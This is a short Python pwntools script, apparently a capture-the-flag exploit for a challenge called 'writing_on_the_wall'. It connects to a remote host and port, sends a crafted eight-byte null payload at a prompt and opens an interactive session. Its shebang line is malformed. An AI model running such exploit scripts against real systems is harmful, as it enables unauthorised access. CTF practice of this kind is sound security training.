#!usr/bin/env/python3

from pwn import *

buf = p64(0x0000)

# with open("payload", "wb") as binary_file:
#     binary_file.write(buf)

# p = process("./writing_on_the_wall")
p = remote("94.237.49.46",34085)
print(p.recvuntil(">> "))
p.sendline(buf)


p.interactive()
